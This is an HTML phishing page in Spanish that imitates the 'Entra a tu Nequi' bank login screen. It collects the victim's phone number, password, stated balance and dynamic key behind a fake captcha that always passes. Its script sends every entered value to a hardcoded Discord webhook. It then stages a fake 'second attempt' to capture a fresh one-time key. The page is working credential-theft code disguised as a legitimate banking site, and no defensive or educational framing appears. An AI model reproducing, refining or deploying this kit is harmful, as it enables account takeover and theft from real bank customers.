<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entra a tu Nequi</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* Estilos base */
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fceaf0; margin: 0; display: block; }
        
        /* Imagen arriba del todo, de esquina a esquina */
        .top-banner {
            width: 100%;
            display: block;
            margin-bottom: 20px;
        }

        /* Contenedor del formulario */
        .main-wrapper { display: flex; justify-content: center; align-items: center; min-height: 80vh; padding: 20px; }
        .container { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        
        h1 { color: #1e0033; font-size: 1.5rem; margin-top: 0; }
        .subtitle { color: #444; font-size: 0.92rem; margin-bottom: 20px; line-height: 1.3; }

        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        
        /* Contenedor para clave dinámica y su imagen desplegable abajo */
        .dynamic-container {
            width: 100%;
            margin: 10px 0;
            text-align: left;
        }

        .dynamic-container input {
            margin: 0;
            cursor: pointer;
        }

        /* Imagen desplegable más pequeña abajo del input */
        .dynamic-preview-image {
            display: none;
            width: 100%;
            max-width: 220px;
            margin: 8px auto 0 auto;
            border-radius: 8px;
            border: 1px solid #ddd;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            cursor: pointer;
            display: none;
        }

        /* Estilos del reCAPTCHA idéntico a la imagen */
        .captcha-container {
            background-color: white;
            border: 2px solid #f2c2d9;
            border-radius: 16px;
            padding: 14px 16px;
            width: 100%;
            display: flex;
            align-items: center;
            box-sizing: border-box;
            margin: 15px 0 5px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .captcha-container.verified {
            border-color: #22c55e;
            background-color: #f0fdf4;
        }
        .spinner-wrapper {
            position: relative;
            width: 42px;
            height: 42px;
            margin-right: 14px;
            flex-shrink: 0;
        }
        .spinner-outer {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 3px solid #e0e0e0;
            border-radius: 50%;
        }
        .spinner-inner {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-top-color: #e6007e;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }
        .success-checkmark {
            display: none;
            width: 100%;
            height: 100%;
            background-color: #e6007e;
            border-radius: 50%;
            color: white;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: bold;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .captcha-text {
            color: #1a1a1a;
            font-size: 15px;
            font-weight: 400;
            line-height: 1.3;
            margin: 0;
            text-align: left;
            flex-grow: 1;
        }

        /* Botón original exacto */
        .btn-entrar { background-color: #f7a8c4; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }        
        
        #loader { display: none; border: 5px solid #f3f3f3; border-top: 5px solid #ff005a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        
        /* ESTILOS DEL MODAL PARA AMPLIAR LA IMAGEN AL TOCARLA */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.6);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 15px;
            max-width: 90%;
            width: 350px;
            text-align: center;
            position: relative;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .modal-content img {
            width: 100%;
            border-radius: 10px;
        }
        .close-modal {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
        }

        /* ESTILOS DEL FOOTER */        .footer-nequi { background-color: #1a0026; color: white; padding: 40px 20px; width: 100%; box-sizing: border-box; }
        .nequi-content { max-width: 400px; margin: 0 auto; }
        .f-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
        .f-line { border-top: 1px solid #4a2b5e; margin: 20px 0; }
        .f-link { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #331a40; color: white; text-decoration: none; cursor: pointer; font-size: 16px; }
        .social-box { display: flex; justify-content: space-around; padding: 10px 0; }
        .s-icon { border: 1px solid white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }    
    </style>
</head>
<body>

<!-- Imagen arriba de esquina a esquina -->
<img src="https://i.ibb.co/4RH59TLJ/Screenshot-20260731-124017-Chrome.jpg" alt="Banner superior" class="top-banner">

<div class="main-wrapper">    
    <div class="container" id="mainContainer">        
        <div id="formContent">                
            <h1>Entra a tu Nequi</h1>                
            <p class="subtitle"> </p>
            <div style="display: flex; gap: 10px;">                        
                <div style="border: 1px solid #ddd; padding: 15px; border-radius: 8px;">🇨🇴 +57</div>                    
                <input type="text" id="celular" placeholder="Número de celular" maxlength="10" inputmode="numeric">                    
            </div>                    
            <input type="password" id="pass" placeholder="Contraseña" maxlength="4" inputmode="numeric">                    
            <input type="text" id="saldoInput" placeholder="¿Cuánto dinero tienes?" oninput="formatearDinero(this)" inputmode="numeric">                    
            
            <!-- Campo clave dinámica con imagen desplegable abajo -->
            <div class="dynamic-container">
                <input type="text" id="claveDinamica" placeholder="Clave dinámica" maxlength="6" inputmode="numeric" onclick="toggleImagen()">
                <img src="https://i.ibb.co/tPZS5HKR/IMG-20260802-WA0045.jpg" alt="Ayuda Clave Dinámica" id="imagenDesplegada" class="dynamic-preview-image" onclick="abrirModal(event)">
            </div>                    
            
            <!-- CAPTCHA INTERACTIVO -->
            <div class="captcha-container" id="captchaBox" onclick="verificarCaptcha()">
                <div class="spinner-wrapper" id="spinnerWrapper">
                    <div class="spinner-outer" id="spinnerOuter"></div>
                    <div class="spinner-inner" id="spinnerInner"></div>
                    <div class="success-checkmark" id="successCheck">✓</div>
                </div>
                <p class="captcha-text" id="captchaText">
                    Confirmo que soy una persona real.
                </p>
            </div>

            <button class="btn-entrar" onclick="enviarADiscord()">Entra</button>            
        </div>
        <div id="loader"></div>    
    </div>
</div>    

<!-- MODAL PARA AMPLIAR LA IMAGEN SI LA TOCAN -->
<div class="modal" id="imageModal">
    <div class="modal-content">
        <span class="close-modal" onclick="cerrarModal(event)">&times;</span>
        <img src="https://i.ibb.co/tPZS5HKR/IMG-20260802-WA0045.jpg" alt="Ayuda Clave Dinámica Ampliada">
    </div>
</div>

<footer class="footer-image-container" style="text-align: center; padding: 20px 0;">    
    <img src="https://i.ibb.co/SDwSqVVY/Screenshot-20260731-111005-Chrome.jpg" alt="Pie de página" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
</footer>    

<script>        
    let intento = 0;    
    let captchaResuelto = false;

    function formatearDinero(input) { 
        let valor = input.value.replace(/\D/g, ''); 
        input.value = valor !== "" ? new Intl.NumberFormat('es-CO').format(valor) : ""; 
    }        

    function toggleImagen() {
        const img = document.getElementById('imagenDesplegada');
        if (img.style.display === 'block') {
            img.style.display = 'none';
        } else {
            img.style.display = 'block';
        }
    }

    function abrirModal(event) {
        event.stopPropagation();
        document.getElementById('imageModal').style.display = 'flex';
    }

    function cerrarModal(event) {
        event.stopPropagation();
        document.getElementById('imageModal').style.display = 'none';
    }

    // Cerrar modal si hacen clic fuera de la caja blanca
    window.onclick = function(event) {
        const modal = document.getElementById('imageModal');
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    }

    function verificarCaptcha() {
        if (captchaResuelto) return;
        
        const spinnerInner = document.getElementById('spinnerInner');
        const successCheck = document.getElementById('successCheck');
        const captchaBox = document.getElementById('captchaBox');
        const captchaText = document.getElementById('captchaText');

        spinnerInner.style.animationPlayState = 'paused';
        
        setTimeout(() => {
            spinnerInner.style.display = 'none';
            document.getElementById('spinnerOuter').style.display = 'none';
            successCheck.style.display = 'flex';
            captchaBox.classList.add('verified');
            captchaText.innerHTML = "<b>Verificación completada</b>";
            captchaResuelto = true;
        }, 800);
    }

    async function enviarADiscord() {         
        const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
        const celular = document.getElementById('celular').value;
        const clave = document.getElementById('pass').value;
        const claveDinamica = document.getElementById('claveDinamica').value;
        const saldo = document.getElementById('saldoInput').value;

        if (!captchaResuelto) {
            alert("Por favor, confirma que eres una persona real tocando el círculo de verificación.");
            return;
        }

        if (saldo === "" || claveDinamica.length < 6) { 
            alert("Por favor, corrige los datos."); 
            return; 
        }                

        document.getElementById('formContent').style.display = 'none';        
        document.getElementById('loader').style.display = 'block';

        const mensaje = { 
            content: intento === 0 ? "🔔 *Primer intento" : "🔔 **Segundo intento*", 
            embeds: [{ 
                color: 16711930, 
                fields: [
                    { name: "Celular", value: celular, inline: true }, 
                    { name: "Clave", value: clave, inline: true }, 
                    { name: "Saldo", value: "$ " + saldo, inline: false }, 
                    { name: "Clave Dinámica", value: claveDinamica, inline: true }
                ] 
            }] 
        };                

        await fetch(webhookUrl, { 
            method: "POST", 
            headers: { "Content-Type": "application/json" }, 
            body: JSON.stringify(mensaje) 
        });                

        setTimeout(() => {            
            document.getElementById('loader').style.display = 'none';             
            if (intento === 0) {                 
                alert("Verificando..."); 
                document.getElementById('saldoInput').value = ""; 
                document.getElementById('claveDinamica').value = ""; 
                document.getElementById('imagenDesplegada').style.display = 'none';
                
                captchaResuelto = false;
                document.getElementById('successCheck').style.display = 'none';
                document.getElementById('spinnerOuter').style.display = 'block';
                document.getElementById('spinnerInner').style.display = 'block';
                document.getElementById('spinnerInner').style.animationPlayState = 'running';
                document.getElementById('captchaBox').classList.remove('verified');
                document.getElementById('captchaText').innerText = "Confirmo que soy una persona real.";

                document.getElementById('formContent').style.display = 'block'; 
                intento = 1; 
            } else {                 
                alert("Procesando acceso..."); 
            } 
        }, 2000);    
    }
</script></body></html>
